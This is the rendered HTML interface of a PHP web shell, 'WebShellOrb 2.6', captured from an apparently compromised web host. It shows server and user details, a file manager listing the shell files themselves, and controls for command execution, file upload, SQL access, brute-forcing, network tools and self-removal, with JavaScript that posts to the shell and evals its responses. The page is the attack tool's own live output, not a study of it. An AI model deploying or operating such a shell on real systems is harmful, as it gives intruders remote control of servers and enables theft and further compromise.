<html><head><meta http-equiv='Content-Type' content='text/html; charset=Windows-1251'><title>acquisitionomar.com - WebShellOrb 2.6</title>
<style>
body{background-color:#444;color:#e1e1e1;}
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ color:#fff;background-color:#222; }
span,h1,a{ color: #df5 !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid #df5;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:300px; }
input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid #df5; font: 9pt Monospace,'Courier New'; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#5e5e5e}
.l1{background-color:#444}
.l2{background-color:#333}
pre{font-family:Courier,Monospace;}
</style>
<script>
    var c_ = '/home/infjyiwpig/public_html/';
    var a_ = 'FilesMan'
    var charset_ = 'Windows-1251';
    var p1_ = '';
    var p2_ = '';
    var p3_ = '';
    var d = document;
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
		//if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i<d.mf.elements.length;i++)
			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
		sr('/a-icq-744324366.php', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
</script>
<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux fghsd.co.kr.ckos1pd0fzeuld5ffd5n2jlxcd.hx.internal.cloudapp.net 3.10.0-1062.9.1.el7.x86_64 #1 SMP Fri Dec 6 15:49: </nobr><br>1018 ( infjyiwpig ) <span>Group:</span> 1020 ( infjyiwpig )<br>7.2.27 <span>Safe mode:</span> <font color=green><b>OFF</b></font> <a href=# onclick="g('Php',null,'','info')">[ phpinfo ]</a> <span>Datetime:</span> 2020-02-06 00:11:58<br>975.90 MB <span>Free:</span> 16.00 KB (0%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/home/")'>home/</a><a href='#' onclick='g("FilesMan","/home/infjyiwpig/")'>infjyiwpig/</a><a href='#' onclick='g("FilesMan","/home/infjyiwpig/public_html/")'>public_html/</a> <font color=#25ff00>drwxr-x---</font> <a href=# onclick="g('FilesMan','/home/infjyiwpig/public_html','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset"><option value="UTF-8" >UTF-8</option><option value="Windows-1251" selected>Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></optgroup></select><br><span>Server IP:</span><br>10.0.31.4<br><span>Client IP:</span><br>109.77.71.76</nobr></td></tr></table><table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr><th width="11%">[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th width="11%">[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th width="11%">[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th width="11%">[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th width="11%">[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th width="11%">[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th width="11%">[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th width="11%">[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th width="11%">[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div style="margin:5"><h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script><script>
	function sa() {
		for(i=0;i<d.files.elements.length;i++)
			if(d.files.elements[i].type == 'checkbox')
				d.files.elements[i].checked = d.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g("FilesMan",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify_0")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g("FilesMan",null,"s_perms_0")'>Permissions</a></th><th>Actions</th></tr><tr><td><input type=checkbox name="f[]" value="." class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/infjyiwpig/public_html/.');" ><b>[ . ]</b></a></td><td>dir</td><td>2020-02-04 11:34:00</td><td>infjyiwpig/infjyiwpig</td><td><a href=# onclick="g('FilesTools',null,'.','chmod')"><font color=#25ff00>drwxr-x---</font></td><td><a href="#" onclick="g('FilesTools',null,'.', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'.', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/infjyiwpig/public_html/..');" ><b>[ .. ]</b></a></td><td>dir</td><td>2020-01-28 12:20:44</td><td>infjyiwpig/infjyiwpig</td><td><a href=# onclick="g('FilesTools',null,'..','chmod')"><font color=#25ff00>drwx--x--x</font></td><td><a href="#" onclick="g('FilesTools',null,'..', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'..', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value=".well-known" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/infjyiwpig/public_html/.well-known');" ><b>[ .well-known ]</b></a></td><td>dir</td><td>2020-01-25 19:28:07</td><td>infjyiwpig/infjyiwpig</td><td><a href=# onclick="g('FilesTools',null,'.well-known','chmod')"><font color=#25ff00>drwxr-xr-x</font></td><td><a href="#" onclick="g('FilesTools',null,'.well-known', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'.well-known', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="activate" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/infjyiwpig/public_html/activate');" ><b>[ activate ]</b></a></td><td>dir</td><td>2020-02-04 16:22:24</td><td>infjyiwpig/infjyiwpig</td><td><a href=# onclick="g('FilesTools',null,'activate','chmod')"><font color=#25ff00>drwxr-xr-x</font></td><td><a href="#" onclick="g('FilesTools',null,'activate', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'activate', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value="cgi-bin" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/infjyiwpig/public_html/cgi-bin');" ><b>[ cgi-bin ]</b></a></td><td>dir</td><td>2020-01-25 19:24:44</td><td>infjyiwpig/infjyiwpig</td><td><a href=# onclick="g('FilesTools',null,'cgi-bin','chmod')"><font color=#25ff00>drwxr-xr-x</font></td><td><a href="#" onclick="g('FilesTools',null,'cgi-bin', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'cgi-bin', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value=".htaccess" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'.htaccess', 'view')">.htaccess</a></td><td>160 B</td><td>2020-01-28 18:36:18</td><td>infjyiwpig/infjyiwpig</td><td><a href=# onclick="g('FilesTools',null,'.htaccess','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'.htaccess', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'.htaccess', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'.htaccess', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'.htaccess', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="a-icq-744324366.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'a-icq-744324366.php', 'view')">a-icq-744324366.php</a></td><td>64.48 KB</td><td>2020-02-04 11:34:00</td><td>infjyiwpig/infjyiwpig</td><td><a href=# onclick="g('FilesTools',null,'a-icq-744324366.php','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'a-icq-744324366.php', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'a-icq-744324366.php', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'a-icq-744324366.php', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'a-icq-744324366.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="test.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'test.php', 'view')">test.php</a></td><td>670 B</td><td>2020-01-30 18:03:00</td><td>infjyiwpig/infjyiwpig</td><td><a href=# onclick="g('FilesTools',null,'test.php','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'test.php', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'test.php', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'test.php', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'test.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="x-icq-744324366.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'x-icq-744324366.php', 'view')">x-icq-744324366.php</a></td><td>145.58 KB</td><td>2020-02-04 11:12:07</td><td>infjyiwpig/infjyiwpig</td><td><a href=# onclick="g('FilesTools',null,'x-icq-744324366.php','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'x-icq-744324366.php', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'x-icq-744324366.php', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'x-icq-744324366.php', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'x-icq-744324366.php', 'download')">D</a></td></tr><tr><td colspan=7>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='/home/infjyiwpig/public_html/'>
	<input type=hidden name=charset value='Windows-1251'>
	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><option value='tar'>Compress (tar.gz)</option></select>&nbsp;<input type='submit' value='>>'></td></tr></form></table></div>
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
	<tr>
		<td><form onsubmit='g(null,this.c.value,"");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/home/infjyiwpig/public_html/'><input type=submit value='>>'></form></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr>
		<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='green'>(Writeable)</font><br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='green'>(Writeable)</font><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr>
		<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='/home/infjyiwpig/public_html/'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='Windows-1251'>
		<span>Upload file:</span> <font color='green'>(Writeable)</font><br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
	</tr></table></div></body></html>